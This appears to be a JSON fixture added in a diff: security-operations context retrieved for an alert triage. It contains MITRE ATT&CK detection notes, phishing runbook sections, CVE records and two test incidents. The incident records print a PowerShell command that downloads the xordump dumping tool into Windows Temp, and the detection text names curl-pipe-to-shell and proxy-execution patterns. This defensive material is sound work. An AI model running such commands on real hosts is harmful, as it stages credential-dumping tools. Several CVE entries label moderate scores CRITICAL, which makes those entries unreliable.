@@ -1,0 +1,280 @@
+{
+  "mitre_techniques": [
+    {
+      "id": "2a956efd-4055-5f34-a83f-74c3420e2f2b",
+      "version": 225,
+      "score": 0.6093373,
+      "payload": {
+        "technique_id": "T1218",
+        "name": "System Binary Proxy Execution",
+        "tactic": [
+          "stealth"
+        ],
+        "platforms": [
+          "Linux",
+          "macOS",
+          "Windows"
+        ],
+        "is_sub_technique": false,
+        "parent_technique_id": null,
+        "x_mitre_version": "4.0",
+        "detection_strategy_id": "DET0081",
+        "analytic_ids": [
+          "AN0226",
+          "AN0227",
+          "AN0228"
+        ],
+        "log_sources": [
+          "WinEventLog:Sysmon",
+          "auditd:SYSCALL",
+          "macos:osquery",
+          "macos:unifiedlog"
+        ],
+        "embedding_text": "stealth. System Binary Proxy Execution (T1218). Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Detection: Execution of trusted, Microsoft-signed binaries such as `rundll32.exe`, `msiexec.exe`, or `regsvr32.exe` used to execute externally hosted, unsigned, or suspicious payloads through command-line parameters or network retrieval. Execution of trusted system binaries (e.g., `split`, `tee`, `bash`, `env`) used in uncommon sequences or chained behaviors to execute malicious payloads or perform actions inconsistent with normal system or script behavior. Use of system binaries such as `osascript`, `bash`, or `curl` to download or execute unsigned code or files in conjunction with application proxying. Log sources: WinEventLog:Sysmon, auditd:SYSCALL, macos:osquery, macos:unifiedlog."
+      }
+    },
+    {
+      "id": "cd4e91c1-eb03-5823-8e7b-d6bc626a7dbb",
+      "version": 116,
+      "score": 0.6065104,
+      "payload": {
+        "technique_id": "T1204.002",
+        "name": "Malicious File",
+        "tactic": [
+          "execution"
+        ],
+        "platforms": [
+          "Linux",
+          "macOS",
+          "Windows"
+        ],
+        "is_sub_technique": true,
+        "parent_technique_id": "T1204",
+        "x_mitre_version": "1.6",
+        "detection_strategy_id": "DET0294",
+        "analytic_ids": [
+          "AN0819",
+          "AN0820",
+          "AN0821"
+        ],
+        "log_sources": [
+          "WinEventLog:Sysmon",
+          "auditd:SYSCALL",
+          "macos:endpointsecurity",
+          "macos:unifiedlog"
+        ],
+        "embedding_text": "execution. Malicious File (T1204.002). An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Detection: User opens a file delivered by email, web, chat, or share. The handler application (Word/PDF reader/archiver) creates a file in user-controlled paths (Downloads, Temp, Desktop) and then spawns a new or unusual child process (e.g., powershell.exe, wscript.exe, cmd.exe, regsvr32.exe, rundll32.exe, msiexec.exe). Optional precursors include FileStreamCreated (URL/UNC) and Office \u2192 system32 batch writes. User opens a downloaded document/installer leading to EndpointSecurity file create in ~/Downloads or ~/Library paths then an exec of a suspicious utility (osascript, bash/zsh, curl, chmod, open with -a Terminal). Correlates File Creation with subsequent process exec and, optionally, quarantine/LSQuarantine events. User or desktop application writes a new file to ~/Downloads, /tmp, or mounted removable media followed by execve of a risky interpreter/loader (bash, sh, python, perl, php, node, curl|wget piping to sh, ld.so, rdesktop, xdg-open - with unusual args). Uses auditd PATH+SYSCALL (open/creat/write/rename) with execve event linking. Log sources: WinEventLog:Sysmon, auditd:SYSCALL, macos:endpointsecurity, macos:unifiedlog."
+      }
+    },
+    {
+      "id": "ad193773-5e85-5c37-9209-8295eb9f5639",
+      "version": 42,
+      "score": 0.5759659,
+      "payload": {
+        "technique_id": "T1574.007",
+        "name": "Path Interception by PATH Environment Variable",
+        "tactic": [
+          "stealth",
+          "execution"
+        ],
+        "platforms": [
+          "Linux",
+          "macOS",
+          "Windows"
+        ],
+        "is_sub_technique": true,
+        "parent_technique_id": "T1574",
+        "x_mitre_version": "2.0",
+        "detection_strategy_id": "DET0004",
+        "analytic_ids": [
+          "AN0009",
+          "AN0010",
+          "AN0011"
+        ],
+        "log_sources": [
+          "WinEventLog:Security",
+          "WinEventLog:Sysmon",
+          "auditd:SYSCALL",
+          "linux:osquery",
+          "macos:unifiedlog"
+        ],
+        "embedding_text": "stealth, execution. Path Interception by PATH Environment Variable (T1574.007). Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing. Detection: Abnormal modification of the PATH environment variable or registry keys controlling system paths, combined with execution of binaries named after legitimate system tools from user-writable directories. Defender correlates registry modifications, file creation of suspicious binaries, and process execution paths inconsistent with baseline system directories. User modification of the $PATH environment variable in shell configuration files or direct runtime PATH changes, followed by execution of binaries from user-controlled directories. Defender observes file edits to ~/.bashrc, ~/.profile, or /etc/paths.d and process execution resolving to unexpected binary locations. Modification of PATH or HOME environment variables through shell config files, launchctl, or /etc/paths.d entries, combined with process execution from attacker-controlled directories. Defender correlates file changes in /etc/paths.d with process execution resolving to malicious binaries. Log sources: WinEventLog:Security, WinEventLog:Sysmon, auditd:SYSCALL, linux:osquery, macos:unifiedlog."
+      }
+    }
+  ],
+  "soc_playbooks": [
+    {
+      "id": "bec8945b-6619-5b8f-ade8-73ebe80c0859",
+      "version": 45,
+      "score": 0.62331307,
+      "payload": {
+        "runbook_id": "phishing-response",
+        "title": "Phishing Incident Response",
+        "category": "Social Engineering",
+        "section": "Investigation Steps",
+        "type": "runbook",
+        "runbook_section_id": "phishing-response-investigation-steps",
+        "document_text": "Runbook: Phishing Incident Response\nCategory: Social Engineering\nSection: Investigation Steps\n\n1. **Collect the phishing email:**\n   - Obtain original email with full headers (as .eml file)\n   - Do not click links or open attachments in production environment\n   - Use email admin console to preserve a copy before deleting\n\n2. **Analyze email headers:**\n   ```\n   # Key headers to examine:\n   - Return-Path vs From address (spoofing indicator)\n   - Received: chain (trace sending servers)\n   - X-Originating-IP (actual sender IP)\n   - DKIM-Signature (verify or note absence)\n   - SPF and DMARC results (check Authentication-Results header)\n   ```\n\n3. **Investigate URLs and attachments (in sandbox):**\n   - Submit URLs to VirusTotal, URLScan.io, or internal sandbox\n   - Detonate attachments in isolated sandbox (Cuckoo, Any.run)\n   - Extract IOCs: domains, IPs, file hashes, C2 URLs\n\n4. **Identify all affected recipients:**\n   ```\n   # Query email gateway/Exchange/Office365 for recipients\n   # Office 365 (PowerShell):\n   Search-UnifiedAuditLog -StartDate <date> -EndDate <date> -Operations \"Send\" -UserIds <sender>\n   Get-MessageTrace -SenderAddress <phishing_sender> -StartDate <date>\n   ```\n\n5. **Determine if any users clicked/interacted:**\n   - Review proxy/web gateway logs for connections to phishing URLs\n   - Check email gateway for open/click tracking events\n   - Query EDR for script execution or file downloads matching IOC hashes\n   - Review Office365 sign-in logs for unusual authentication events\n\n6. **Assess credential compromise:**\n   - Check for Office365/Active Directory login anomalies post-click\n   - Look for impossible travel (login from different geography)\n   - Verify no MFA bypass or new MFA device enrollment"
+      }
+    },
+    {
+      "id": "7d207b4a-717a-5e8b-a18c-3bc752cf5194",
+      "version": 44,
+      "score": 0.59998906,
+      "payload": {
+        "runbook_id": "phishing-response",
+        "title": "Phishing Incident Response",
+        "category": "Social Engineering",
+        "section": "Detection",
+        "type": "runbook",
+        "runbook_section_id": "phishing-response-detection",
+        "document_text": "Runbook: Phishing Incident Response\nCategory: Social Engineering\nSection: Detection\n\nIndicators of a phishing campaign:\n\n- User reports suspicious email to security team\n- Email gateway alert (spam score, malicious URL, attachment sandbox detonation)\n- SIEM alert for mass email delivery or unusual sender patterns\n- DNS query to known phishing domain from internal hosts\n- Wazuh alert for document macro execution or script download\n- User account accessing credential harvesting page (proxy logs)\n- Multiple users reporting same suspicious email (coordinated campaign)\n- Anti-phishing tool alert (Microsoft Defender, Proofpoint, Mimecast)"
+      }
+    },
+    {
+      "id": "c3431aa5-4532-54dd-b753-809e14928b1b",
+      "version": 43,
+      "score": 0.5988321,
+      "payload": {
+        "runbook_id": "phishing-response",
+        "title": "Phishing Incident Response",
+        "category": "Social Engineering",
+        "section": "Scope",
+        "type": "runbook",
+        "runbook_section_id": "phishing-response-scope",
+        "document_text": "Runbook: Phishing Incident Response\nCategory: Social Engineering\nSection: Scope\n\nThis runbook covers the detection and response to phishing attacks targeting employees via email, SMS (smishing), or voice calls (vishing). Phishing is the primary initial access vector for most security incidents.\n\n**Applies to:** All users and email systems.\n**MITRE ATT&CK:** T1566 - Phishing, T1566.001 - Spearphishing Attachment, T1566.002 - Spearphishing Link"
+      }
+    }
+  ],
+  "cve_context": [
+    {
+      "id": "284d8f3a-0e9b-59cf-8ece-6b499536d548",
+      "version": 1190,
+      "score": 0.6573353,
+      "payload": {
+        "cve_id": "CVE-2026-2173",
+        "cvss_score": 7.3,
+        "severity": "CRITICAL",
+        "published_date": "2026-02-08",
+        "affected_products": [
+          "fabian:online_examination_system"
+        ],
+        "type": "cve"
+      }
+    },
+    {
+      "id": "394954d7-554f-599f-9d13-301335fd7134",
+      "version": 1772,
+      "score": 0.6532606,
+      "payload": {
+        "cve_id": "CVE-2026-32913",
+        "cvss_score": 9.3,
+        "severity": "CRITICAL",
+        "published_date": "2026-03-23",
+        "affected_products": [
+          "openclaw:openclaw"
+        ],
+        "type": "cve"
+      }
+    },
+    {
+      "id": "1966e14d-c1c4-5213-896d-48afac3aa7f5",
+      "version": 1757,
+      "score": 0.65247536,
+      "payload": {
+        "cve_id": "CVE-2026-32046",
+        "cvss_score": 5.3,
+        "severity": "CRITICAL",
+        "published_date": "2026-03-21",
+        "affected_products": [
+          "openclaw:openclaw"
+        ],
+        "type": "cve"
+      }
+    },
+    {
+      "id": "891dfb46-88e1-5eae-a3be-b1640bdf0fd9",
+      "version": 1189,
+      "score": 0.6507232,
+      "payload": {
+        "cve_id": "CVE-2026-2172",
+        "cvss_score": 7.3,
+        "severity": "CRITICAL",
+        "published_date": "2026-02-08",
+        "affected_products": [
+          "fabian:online_application_system_for_admission"
+        ],
+        "type": "cve"
+      }
+    },
+    {
+      "id": "5afbb41d-e0e7-5520-b8c7-728a7f579833",
+      "version": 1534,
+      "score": 0.6496733,
+      "payload": {
+        "cve_id": "CVE-2026-28454",
+        "cvss_score": 7.5,
+        "severity": "CRITICAL",
+        "published_date": "2026-03-05",
+        "affected_products": [
+          "openclaw:openclaw"
+        ],
+        "type": "cve"
+      }
+    }
+  ],
+  "incident_history": [
+    {
+      "id": "012093ed-4047-5ee4-974c-c24d0ba35fde",
+      "version": 14,
+      "score": 0.7539808,
+      "payload": {
+        "incident_id": "~8613944",
+        "case_number": 2,
+        "title": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq",
+        "severity": 3,
+        "status": "TruePositive",
+        "stage": "Closed",
+        "attack_type": "Suspicious Invoke-WebRequest Execution",
+        "tags": [
+          "172.20.24.99",
+          "agent-id:1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
+          "engine:sigma",
+          "rule:Suspicious Invoke-WebRequest Execution",
+          "security-onion",
+          "win-kvkmd51ggkq"
+        ],
+        "summary": "this closing is only for test",
+        "end_date": "2026-08-13",
+        "engine": "sigma",
+        "embedding_text": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq\nDetection engine: sigma\nRule: Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc)\nHost: win-kvkmd51ggkq (172.20.24.99)\nAgent ID: 1a52ee32-ef93-4f5a-b876-65bd1b7c795a\nCommand line: \"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \\\"\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\\\"\" -OutFile C:\\Windows\\Temp\\xordump.exe}\nSummary: this closing is only for test\nRules: rule:Suspicious Invoke-WebRequest Execution\nResolution: TruePositive"
+      }
+    },
+    {
+      "id": "7d29fa73-588f-5c9f-8b99-e906c479fab7",
+      "version": 13,
+      "score": 0.746565,
+      "payload": {
+        "incident_id": "~4653208",
+        "case_number": 3,
+        "title": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq",
+        "severity": 3,
+        "status": "FalsePositive",
+        "stage": "Closed",
+        "attack_type": "Suspicious Invoke-WebRequest Execution",
+        "tags": [
+          "172.20.24.99",
+          "agent-id:1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
+          "engine:sigma",
+          "rule:Suspicious Invoke-WebRequest Execution",
+          "security-onion",
+          "win-kvkmd51ggkq"
+        ],
+        "summary": "this case is for test",
+        "end_date": "2026-08-13",
+        "engine": "sigma",
+        "embedding_text": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq\nDetection engine: sigma\nRule: Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc)\nHost: win-kvkmd51ggkq (172.20.24.99)\nAgent ID: 1a52ee32-ef93-4f5a-b876-65bd1b7c795a\nCommand line: \"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \\\"\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\\\"\" -OutFile C:\\Windows\\Temp\\xordump.exe}\nSummary: this case is for test\nRules: rule:Suspicious Invoke-WebRequest Execution\nResolution: FalsePositive"
+      }
+    }
+  ]
+}
